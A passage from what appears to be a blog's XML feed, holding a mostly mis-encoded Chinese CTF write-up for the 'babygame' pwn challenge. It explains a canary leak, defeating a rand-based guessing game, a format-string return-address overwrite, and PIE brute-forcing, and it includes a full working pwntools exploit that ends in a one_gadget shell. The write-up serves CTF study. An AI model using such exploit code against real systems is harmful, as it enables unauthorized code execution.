39022867c9b07b5c746636af36274d4a166d438ceac5af7256ae605b6cc6aca457beae8d9b1831919e02181ce9abe445c523fc0a8cbaf3f293e51b90f876941a9844663f8e2dfd63d39ebdcda98f78a74847a35a56559bab3275b89c5b7a07eaf4e1f7be7678cc49fa874fb7156e515d6410e5c9ab464f4419d1fd811158537fb793e756a7a638b6d7c9b4f367edb0f3d922582bb06fbf219bb27a95b344bd501ce37d01feedde584df1d481f224dd3fdafdee5f89386d33e432e40fcc144f5261de56f3108445f692041df2eb5e3ac200a21f9d76c3df3da076522e457ac6e93306d005d15a97686b6415a8cf7f2e0891722c7e8861d437d408b4091472a32cb4f52895e849d488779e5e461c4aea282be52619a62eeea1899f1d17004f9e49027948e7fe444f67dd66c417c148e299064ec289440f60ca2250cc3c07b00abfa949b016f0e661fc68cd20437389bf676cb057c79fb4ae3ffc5a4411f46ab0959bf590e28755265c456ec222ad3b2fc8db0a710d1976e77c0734feecae02e3adf111216657d2a8a52388c232c0fb5149237e3956ff3529f537d40f7c7f4296b768fa27ee685b58f0929dd34888decb598d79a518204cabd2dc0a2636ac4ae12264f65b45e786640e7dc57d2f62f03e57ea3dc9f82e05912d7d5cdd9d9c1393a5d289bf02170923da5e4b6fbccccb9fbe325cc709c492a5bbf85ce151d3b663ab001119cc3b25eeb0daab2a07900da12cc4c563dba1013bf2a7e4d605914cb96028397ea9c709a726ff0541e328555d3f6efe24459ee5ff3a294b8ab33759705bbef16d4c1960674beb13dae5e5a5053b218a1d792ee218e765e5c760466876968c14dca33eca8d1c23fe96a8ed24dd12a2e734ef6b9c317851ef37d125cc3ca6b644ac1423dd88f66087c8f9be60c54722aa8322e87454ad4458f3e1e0af8e1b1615f71e009744b7092d2c385a7eabc67685697ef9cb365686b6886be8781ce93bdad90dd87538db21419ae6cde1da7f11de30ff17e4975470279f26c7322e21a74917d1bc2a8f99d1a96802fe8c9377879362edaf0e7e3640877fb4f12cc79b372c40f9f4796f5a71bd7261b8ebe031535bf4cf095e5412831aec6f35f0dffaa8b32a073598186ac7cd1efe000911cc785f22f1ddf1cee8fb0a2b2d6c8069a13c5e0d9e4ea5e1bc56ade72ba705f074c34c735b4eed834dd649c6531696a590ae635d8ec83c33f20e3a23de3fcc6c24b26469deb585fd981231df34e05f26ddb7a066d2cb706fc0dd4cae3c1cd43674f07f0d2f5539b6e6689924bd430a5ae4729daed862a08c60a01110e990278c52bd860804a55a8ce97770c5594d255ce65d8f68b900fc99722c7926a42c5b6aa86103ac1deb202</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ç§æˆ¿èœ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ²™ç®±é€ƒé€¸ </tag>
            
            <tag> ç¯¡æ”¹gotè¡¨ </tag>
            
            <tag> lab </tag>
            
            <tag> å¤šçº¿ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è™ç¬¦CTF2022 babygame</title>
      <link href="/posts/9107d8ac.html"/>
      <url>/posts/9107d8ac.html</url>
      
        <content type="html"><![CDATA[<p>æ€»ç»“ï¼š</p><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰ï¼š</p><p>1ã€ç¬¬ä¸€æ¬¡å°è¯•ç”¨çˆ†ç ´çš„æ–¹å¼æ¥å¯¹æŠ—PIEä¿æŠ¤</p><p>2ã€é‡æ–°æ¸©ä¹ äº†ä¸‹çŒœæ•°æ¸¸æˆè¿™ç§ç±»å‹çš„é¢˜ç›®ï¼ˆæ€è·¯å°±æ˜¯æƒ³åŠæ³•è¦†ç›–ç§å­ï¼Œè‡ªå·±è·‘ä¸ªè„šæœ¬ï¼‰</p><p>3ã€%sé¡ºå¸¦æ‰“å°å‡ºæ¥canaryå¹¶ä¸”æ³„éœ²æ ˆä¸­æ•°æ®ï¼ˆæƒå½“å¤ä¹ äº†ï¼‰</p><p>4ã€åšé¢˜æ²¡æ€è·¯çš„æ—¶å€™ï¼Œå°±å…ˆå†™ä¸ªåŠæˆå“è„šæœ¬ï¼ŒåŠ¨æ€è°ƒè¯•ä¸€ä¸‹ï¼Œæ€»èƒ½å¾—åˆ°ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ã€‚</p><p>5ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿™é“é¢˜è€ƒå¯Ÿäº†ä¸€ä¸ªpayloadé‡Œé¢ï¼ŒåŒæ—¶å†™å’ŒåŒæ—¶è¯»ã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220324174639847-1315554433.png"></p><h2 id="é¢˜ç›®åˆ†æï¼š"><a href="#é¢˜ç›®åˆ†æï¼š" class="headerlink" title="é¢˜ç›®åˆ†æï¼š"></a>é¢˜ç›®åˆ†æï¼š</h2><p><img src="/../img/2706180-20220324174650447-1634759747.png"></p><p>å‘ç°äº†æº¢å‡ºç‚¹ï¼ˆä¸è¿‡ç¨‹åºå¼€äº†canary)ï¼Œå¹¶ä¸”æœ‰ä¸ªsrandå‡½æ•°ï¼ŒçŒœæµ‹åº”è¯¥é¢˜ç›®æ˜¯ä¸ªçŒœæ•°æ¸¸æˆï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥æ§åˆ¶seedã€‚</p><p><img src="/../img/2706180-20220324174704154-1694550770.png"></p><p>çŒœæ•°çš„é€»è¾‘æ˜¯éšæœºç”Ÿæˆä¸€ä¸ªæ•°å­—ï¼ˆå¯èƒ½ä¸º0,1,2ï¼‰ï¼Œå¦‚æœæ˜¯0ï¼Œä½ å°±è¦è¾“å…¥1ï¼›å¦‚æœæ˜¯1ï¼Œä½ å°±è¦è¾“å…¥2ï¼›å¦‚æœæ˜¯2ï¼Œä½ å°±è¦è¾“å…¥0ã€‚å¦åˆ™çš„è¯å°±è¿”å›0ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶å°±ç»§ç»­å¾ªç¯ï¼Œç›´è‡³100æ¬¡ï¼Œå¦‚æœå…¨éƒ¨æ»¡è¶³æ¡ä»¶å°±è¿”å›1ã€‚</p><p><img src="/../img/2706180-20220324174714420-1154506487.png"></p><p>å¦‚æœè¿”å›çš„æ˜¯1ï¼Œå°±å¯ä»¥è¿›å…¥è¿™ä¸ªsub_13F7å‡½æ•°ï¼Œå‘ç°è¿™ä¸ªå‡½æ•°è™½ç„¶æ²¡æœ‰æº¢å‡ºï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><h2 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h2><p>é¦–å…ˆè€ƒè™‘ä¸€ä¸ªç‚¹ï¼Œç¨‹åºç»™äº†æº¢å‡ºç‚¹ï¼Œå¦‚æœä¸ç”¨å°±å¤ªå¯æƒœäº†ã€‚ç”¨çš„è¯å°±è¦å…ˆæ³„éœ²canaryã€‚å¯ä»¥å‘ç°readåé¢ç´§æ¥ç€æœ‰ä¸€ä¸ª%så°†bufæ‰€æ‰“å°å‡ºæ¥ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œå¯ä»¥æŠŠcanaryç»™å¸¦å‡ºæ¥ã€‚</p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å¨åŠ›å¾ˆå¤§ï¼Œæƒ³åˆ©ç”¨çš„è¯ï¼Œå°±è¦æ§åˆ¶ç§å­å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹å³å¯è¿›å…¥å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å‡½æ•°ã€‚</p><p>ä¸ºäº†ä¸å°†%sæ‰“å°çš„å†…å®¹æˆªæ–­ï¼Œæˆ‘ä»¬è€ƒè™‘æŠŠreadè¾“å…¥çš„å†…å®¹å…¨å†™æˆ\x11ï¼Œç›´åˆ°æŠŠcanaryçš„00ç»™è¦†ç›–äº†ï¼ˆé˜²æ­¢00æˆªæ–­%sï¼‰ã€‚</p><p><img src="/../img/2706180-20220324174724027-646162084.png"></p><p>å‘ç°canaryå­˜æ”¾çš„æ˜¯var_18ã€‚</p><p><img src="/../img/2706180-20220324174732236-219441364.png"></p><p>readè¾“å…¥çš„bufåœ¨è¿™é‡Œ<img src="/../img/2706180-20220324174740965-1855297000.png"></p><p>å› æ­¤offset&#x3D;0x120-0x18+1&#x3D;0x109ï¼ˆåŠ 1çš„ç›®çš„æ˜¯ä¸ºäº†æŠŠcanaryçš„00ç»™è¦†ç›–äº†ï¼‰</p><p>ç„¶åè€ƒè™‘ä¸‹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ€ä¹ˆç”¨ï¼Ÿå¦‚æœåªæ ¹æ®ç°åœ¨è·å–çš„ä¿¡æ¯çš„è¯ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆç”¨ï¼Œä¸è¿‡å¯ä»¥å…ˆæŠŠè„šæœ¬å†™å‡ºæ¥ï¼Œè°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æ ˆé‡Œé¢æœ‰æ²¡æœ‰å¯ç”¨çš„ä¿¡æ¯ã€‚</p><p>åŠæˆå“è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0x1435)\nc&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">lib=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">0x1111111111111111</span>)</span><br><span class="line">payload=<span class="number">0x109</span>*<span class="string">&#x27;\x11&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    v2=libc.rand()%<span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">0</span>:</span><br><span class="line">        v3=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">1</span>:</span><br><span class="line">        v3=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">2</span>:</span><br><span class="line">        v3=<span class="number">0</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(v3))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç°åœ¨å·²ç»è¿›å…¥åˆ°äº†å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å‡½æ•°ã€‚</p><p><img src="/../img/2706180-20220324174752621-1282773898.png"></p><p><img src="/../img/2706180-20220324174801443-513220805.png"></p><p>æœ‰ä¸¤ä¸ªéå¸¸å€¼å¾—æ³¨æ„çš„ç‚¹ï¼Œä¹Ÿæ˜¯è¿™é“é¢˜çš„çªç ´å£ï¼Œå°±æ˜¯æ ˆé‡Œå­˜äº†ä¸€ä¸ªatoiåç§»16çš„çœŸå®åœ°å€ã€‚æˆ‘ä»¬æœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ‰“å°æ ˆä¸­æ•°æ®ï¼ˆä¸è¿‡æœ‰ä¸ªæ¡ä»¶ï¼‰ï¼Œå€˜è‹¥æ‹¿åˆ°äº†atoiçš„çœŸå®åœ°å€ï¼Œæˆ‘ä»¬å°±è·å¾—äº†libcåŸºåœ°å€ï¼Œç„¶åå°±å¯ä»¥å»æœä¸€ä¸‹one_gadgetäº†ã€‚åˆ«å¿˜äº†ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯å¯ä»¥ä»»æ„åœ°å€ä»»æ„å†™çš„ï¼ˆå°è¯•å°†è¿”å›åœ°å€å†™æˆone_gadgetåœ°å€ï¼‰ã€‚</p><h2 id="é—®é¢˜ä¸å¯¹ç­–"><a href="#é—®é¢˜ä¸å¯¹ç­–" class="headerlink" title="é—®é¢˜ä¸å¯¹ç­–"></a>é—®é¢˜ä¸å¯¹ç­–</h2><p>é‚£ç°åœ¨æœ‰å‡ ä¸ªé—®é¢˜è¦è€ƒè™‘ä¸€ä¸‹ã€‚</p><p>ç¬¬ä¸€ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰“å°æ ˆä¸­æ•°æ®çš„å‰ææ˜¯éœ€è¦æ³„éœ²æ ˆåœ°å€ï¼Œæ‰å¯ä»¥æ‰“å°æŒ‡å®šçš„æ ˆå†…å®¹ï¼Œæ€ä¹ˆæ³„éœ²æ ˆåœ°å€ï¼Ÿ</p><p>ç¬¬äºŒï¼Œæ‹¿åˆ°libcåŸºåœ°å€ï¼Œå†å‘é€one_gadgetï¼Œå°±åŠ¿å¿…éœ€è¦åŠ«æŒå‡½æ•°çš„æ§åˆ¶æµï¼Œå¯æ˜¯æˆ‘ä»¬ç¬¬äºŒæ¬¡çš„readæ˜¯æ²¡åŠæ³•æº¢å‡ºçš„ã€‚</p><p>ç¬¬ä¸‰ï¼Œæ€ä¹ˆå¯¹æŠ—PIEä¿æŠ¤ï¼Ÿ</p><h3 id="è§£é‡Šé—®é¢˜ä¸€ï¼š"><a href="#è§£é‡Šé—®é¢˜ä¸€ï¼š" class="headerlink" title="è§£é‡Šé—®é¢˜ä¸€ï¼š"></a>è§£é‡Šé—®é¢˜ä¸€ï¼š</h3><p><img src="/../img/2706180-20220324174811564-1299319852.png"></p><p>æˆ‘ä»¬å†æ¬¡è§‚å¯Ÿæ ˆä¸­çš„æ•°æ®å‘ç°ï¼Œcanaryè¢«%sæ‰“å°å®Œä¹‹åï¼Œæ‰“å°å¹¶ä¸ä¼šåœæ­¢ï¼ˆå› ä¸ºæ²¡æœ‰é‡è§00ï¼‰ï¼Œå› æ­¤ä¸‹é¢çš„æ ˆä¸­æ•°æ®ä¹Ÿè¢«æ³„éœ²å‡ºæ¥äº†ï¼Œç¢°å·§è¿™ä¸ªæ•°æ®æ˜¯ä¸ªæ ˆåœ°å€ã€‚å› æ­¤æˆ‘ä»¬åªéœ€è¦æ¥æ”¶å®Œcanaryä¹‹åï¼Œå†æ¥æ”¶6å­—èŠ‚ï¼Œå°±å¯ä»¥æ³„éœ²æ ˆåœ°å€äº†ã€‚</p><h3 id="è§£é‡Šé—®é¢˜äºŒï¼š"><a href="#è§£é‡Šé—®é¢˜äºŒï¼š" class="headerlink" title="è§£é‡Šé—®é¢˜äºŒï¼š"></a>è§£é‡Šé—®é¢˜äºŒï¼š</h3><p>ç”±äºæˆ‘ä»¬ç¬¬ä¸€ä¸ªreadè™½ç„¶å¯ä»¥æº¢å‡ºï¼Œä½†æ˜¯æˆ‘ä»¬åªèƒ½å»å¡«å……åƒåœ¾æ•°æ®æŠŠcanaryå’Œleak_stack_addrç»™å¸¦å‡ºæ¥ï¼Œå› æ­¤æ²¡åŠæ³•æ§åˆ¶è¿”å›åœ°å€ï¼Œç¬¬äºŒä¸ªreadæ²¡æ³•æº¢å‡ºã€‚é‚£æˆ‘ä»¬ä¾æ—§<strong>è€ƒè™‘æ ¼å¼åŒ–å­—ç¬¦æ¼æ´ï¼Œå°è¯•ç”¨å®ƒå»ä¿®æ”¹è¿”å›åœ°å€ï¼ˆæˆ‘ä»¬å®Œå…¨å¯ä»¥è¿™æ ·åšï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†æ³„éœ²çš„æ ˆåœ°å€ï¼‰</strong>ï¼Œä¿®æ”¹è¿”å›åœ°å€ä¸ºå“ªä¸ªåœ°å€ï¼Ÿæ¯‹åº¸ç½®ç–‘ï¼Œè¿˜å¾—æ˜¯ç¬¬ä¸€ä¸ªreadçš„åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬è¦å°†one_gadgetåœ°å€æ”¾åˆ°è¿”å›åœ°å€ã€‚å½“æˆ‘è¯•å›¾å°†one_gadgeetåœ°å€å†™å…¥è¿”å›åœ°å€æ—¶ï¼Œçªç„¶æ„è¯†åˆ°å¼€å¯äº†PIEä¿æŠ¤ã€‚</p><h3 id="è§£é‡Šé—®é¢˜ä¸‰ï¼š"><a href="#è§£é‡Šé—®é¢˜ä¸‰ï¼š" class="headerlink" title="è§£é‡Šé—®é¢˜ä¸‰ï¼š"></a>è§£é‡Šé—®é¢˜ä¸‰ï¼š</h3><p>å…ˆçœ‹ä¸‹PIEä¿æŠ¤æ‰€é€ æˆçš„é—®é¢˜å§ã€‚</p><p><img src="/../img/2706180-20220324174821291-294182259.png"></p><p><strong>æˆ‘ç°åœ¨è¯•å›¾å°†lea rax,[rbp-0x120]è¿™ä¸ªæŒ‡ä»¤åœ°å€å†™å…¥è¿”å›åœ°å€</strong>ï¼Œå¯æ˜¯å‘ç°ç”±äºPIEä¿æŠ¤çš„åŸå› ï¼Œæ¯æ¬¡ç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œè¿™ä¸ªåœ°å€åªæœ‰åä¸‰ä½ä¸å˜ï¼Œå‰é¢çš„å†…å®¹éƒ½ä¼šæ”¹å˜ã€‚è¿™ç§æƒ…å†µå°±å¾ˆæ˜¯å°´å°¬ï¼Œ<strong>å› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²å†™çš„æ—¶å€™è¦ä¹ˆä¸€æ¬¡å†™ä¸€å­—èŠ‚ï¼ˆä¸¤ä½ï¼‰ï¼Œè¦ä¹ˆä¸€æ¬¡å†™ä¸¤å­—èŠ‚ï¼ˆå››ä½ï¼‰</strong>ï¼ˆè¿™é‡Œå°±ä¸è€ƒè™‘ä¸€æ¬¡å†™å››å­—èŠ‚çš„æƒ…å†µäº†ï¼‰</p><p>å› æ­¤æˆ‘ä»¬æ ¹æœ¬æ²¡åŠæ³•å»æ­£å¥½æ§åˆ¶åä¸‰ä½ï¼Œé‚£æˆ‘ä»¬åªæ§åˆ¶åä¸¤ä½ï¼Œè®©ç¬¬ä¸‰ä½å»ç»§æ‰¿åŸæœ¬è¿”å›åœ°å€çš„å†…å®¹ï¼Ÿ</p><p>è¿”å›åœ°å€</p><p><img src="/../img/2706180-20220324174830880-911959010.png"></p><p>è¦ä¿®æ”¹æˆçš„åœ°å€<br><img src="/../img/2706180-20220324174839396-1962481222.png"></p><p>å¯ä»¥å‘ç°ï¼Œè¿™ä¿©å¹¶ä¸å‡‘å·§ç›¸åŒã€‚é‚£æ§åˆ¶åå››ä½ï¼ˆå³ä¸¤å­—èŠ‚ï¼‰ï¼Ÿ</p><p><strong>æ§åˆ¶åå››ä½çš„è¯ï¼Œæˆ‘ä»¬ç¡®å®å¯ä»¥å®šæ­»åä¸‰ä½ï¼Œä½†æ˜¯å€’æ•°ç¬¬å››ä½ç”±äºPIEçš„åŸå› ï¼Œå®ƒæ˜¯éšæœºçš„</strong>ï¼Œè¿™æ¡è·¯è¡Œä¸é€šï¼Ÿ</p><p>ç»è¿‡æˆ‘å°è¯•äº†è®¸å¤šåˆ«çš„æ–¹æ³•ï¼Œæ— è®ºå¦‚ä½•ä¹Ÿéƒ½èµ°ä¸é€šï¼Œæœ€åæˆ‘åˆæ‹å›æ¥æƒ³è¿™æ¡è·¯ï¼Œçªç„¶æ„è¯†åˆ°ä¸€ä»¶äº‹ï¼Œåªæœ‰ä»…ä»…æ˜¯å€’æ•°ç¬¬å››ä½éšæœºè€Œå·²ï¼Œ<strong>å¦‚æœçˆ†ç ´å‘¢ï¼Ÿæˆ‘ä»¬å°±éšä¾¿è’™ä¸€ä¸ªå€’æ•°ç¬¬å››ä½ï¼Œæ­£ç¡®çš„æ¦‚ç‡æ˜¯1&#x2F;16</strong>(å·²ç»ä¸ä½äº†)(æ„æ€å°±æ˜¯è¯´æ¯æ¬¡PIEï¼Œä½¿åŸºå€å€’æ•°ç¬¬å››ä½æ˜¯éšæœºçš„ï¼ˆåä¸‰ä½åœ°å€æ˜¯å›ºå®šçš„ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥è’™ä¸€ä¸ªæ•°ï¼Œç„¶åå»è¿è¡Œç¨‹åºï¼Œåªè¦æœ‰ä¸€æ¬¡è¿è¡Œçš„ç¨‹åºåŸºå€å€’æ•°ç¬¬å››ä½æ˜¯æˆ‘ä»¬è’™çš„æ•°å­—ï¼Œå°±è¯´æ˜æˆ‘ä»¬æ­¤æ—¶çˆ†ç ´æˆåŠŸï¼‰ï¼Œæ­¤æ—¶å°±å¯ä»¥é¡ºåˆ©è¿”å›åˆ°one_gadgetçš„åœ°å€äº†ã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">lib=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">    <span class="comment">#gdb.attach(p, &#x27;b * $rebase(0x1435)\nc&#x27;)</span></span><br><span class="line"></span><br><span class="line">    libc.srand(<span class="number">0x1111111111111111</span>)</span><br><span class="line">    payload=<span class="number">0x109</span>*<span class="string">&#x27;\x11&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">    canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        v2=libc.rand()%<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">0</span>:</span><br><span class="line">            v3=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">1</span>:</span><br><span class="line">            v3=<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">2</span>:</span><br><span class="line">            v3=<span class="number">0</span></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(v3))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;%42178c%9$hn&#x27;</span>+<span class="string">&#x27;aaaa&#x27;</span>+<span class="string">&#x27;%27$p&#x27;</span>+<span class="string">&#x27;aaa&#x27;</span>+p64(leak_addr-<span class="number">520</span>)</span><br><span class="line">    <span class="comment">#42178å°±æ˜¯åå…­è¿›åˆ¶çš„a4c2,æˆ‘èµŒå€’æ•°ç¬¬å››ä½æ˜¯a   -&gt;.-&gt;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    atoi_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">16</span></span><br><span class="line">    libc_base=atoi_addr-lib.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    sys_addr=lib.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">    bin_sh_addr=lib.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()+libc_base</span><br><span class="line">    payload2=<span class="number">0x108</span>*<span class="string">&#x27;a&#x27;</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x4f302</span> +libc_base)</span><br><span class="line">    p.send(payload2)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">times=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./a&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        p.interactive()</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        times += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">10</span>+<span class="built_in">str</span>(times)+<span class="string">&quot; times&quot;</span>+<span class="string">&quot;*&quot;</span>*<span class="number">10</span>)</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220324174853430-1511606619.png"><br>PSï¼šè¿™é“é¢˜å¦‚æœæ‰“è¿œç¨‹çš„è¯ï¼Œæ˜¯éœ€è¦ç”¨é¢˜ç›®ä¸­ç»™å‡ºçš„åŠ¨æ€åº“ï¼Œå¦‚æœæœ¬åœ°çš„è¯ï¼Œç”¨è‡ªå·±æœ¬åœ°çš„åŠ¨æ€åº“å°±è¡Œ</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> çŒœæ•°æ¸¸æˆ </tag>
            
            <tag> æ³„éœ²canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-ç¬¬äºŒç«  ä¿¡æ¯çš„è¡¨ç¤ºå’Œå¤„ç†ï¼ˆç¬”è®°ï¼‰</title>
      <link href="/posts/6a3eb07a.html"/>
      <url>/posts/6a3eb07a.html</url>
      
